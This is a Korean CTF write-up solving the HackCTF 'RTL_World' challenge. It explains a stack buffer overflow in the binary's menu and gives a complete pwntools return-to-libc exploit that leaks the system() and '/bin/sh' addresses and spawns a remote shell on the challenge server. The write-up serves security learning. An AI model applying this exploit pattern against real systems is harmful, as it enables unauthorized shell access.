# [Hack CTF] RTL_World 풀이

- IDA로 rtl_world 살펴보기

// main() 함수

![image](https://user-images.githubusercontent.com/59410565/118225176-8f3fac00-b4bf-11eb-91ed-beeef7ac58b8.png)

- dlsym() 함수는 c언어에서 사용하는 함수로 두 번째 인자의 주소를 첫 번째 인자(라이브러리)에서 찾아서 변수에 저장한다. 즉, system의 주소는 v6에 "/bin/sh"의 주소는 s1에 저장된다. 
- case 1을 보아 보호기법이 전혀 존재하지 않는 것 같다.

![image](https://user-images.githubusercontent.com/59410565/118225286-cdd56680-b4bf-11eb-863a-991ac0b01e9d.png)

![image](https://user-images.githubusercontent.com/59410565/118225326-df1e7300-b4bf-11eb-8bfb-be76684b4be4.png)

- case 2는 Get_Money() 함수를 실행시킨다.
- case 3은 gold를 1999만큼 빼고, system()의 주소를 노출(leak)한다.
- case 4는 gold를 2999만큼 빼고, shell("/bin/sh")의 주소를 노출(leak)한다.
- case 5는 buf의 크기보다 더 많이 입력을 받는다. <- buffer overflow!



// Get_Money() 함수

![image](https://user-images.githubusercontent.com/59410565/118225782-b34fbd00-b4c0-11eb-8fcc-e2dd88417edc.png)

![image](https://user-images.githubusercontent.com/59410565/118225826-c6628d00-b4c0-11eb-8c90-790fc7527e81.png)

- gold를 많이 얻기 위해서는 v1에 4를 입력해 주어야 한다.



### 풀이

**[Payload]**

```python
payload = buf(0x8c) + SFP(4) + RET(4)
		= 'A' * (0x8c + 4) + systemAddr + 'BBBB' + shellAddr
```

gold가 많아야 case 3, 4, 5를 실행시킬 수 있기 때문에 반복문을 사용해 gold를 모아 주었다. 그 뒤, system 주소와 "/bin/sh" 주소를 찾아 payload를 완성 시켰다.

```python
from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3010)

for i in range(0, 10):
	p.sendlineafter(">>> ", "2")
	p.sendlineafter("(Job)>>> ", "3")

p.sendlineafter(">>> ", "3")
p.recvuntil("System Armor : ")
sysAddr = p.recvuntil('\n')
sysAddr = int(sysAddr, 16)

p.sendlineafter(">>> ", "4")
p.recvuntil("Shell Sword : ")
binsh = p.recvuntil('\n')
binsh = int(binsh, 16)

p.sendlineafter(">>> ", "5")
p.recvuntil("[Attack] > ")

print hex(sysAddr)
print hex(binsh)

payload = "A" * (0x8c + 4)
payload += p32(sysAddr)
payload += 'BBBB'
payload += p32(binsh)

p.send(payload)
p.interactive()
```



### 결과

![image](https://user-images.githubusercontent.com/59410565/118231144-a6839700-b4c9-11eb-80db-b9632b21578c.png)

![image](https://user-images.githubusercontent.com/59410565/118230688-075e9f80-b4c9-11eb-8450-aff409e001d6.png)

해결!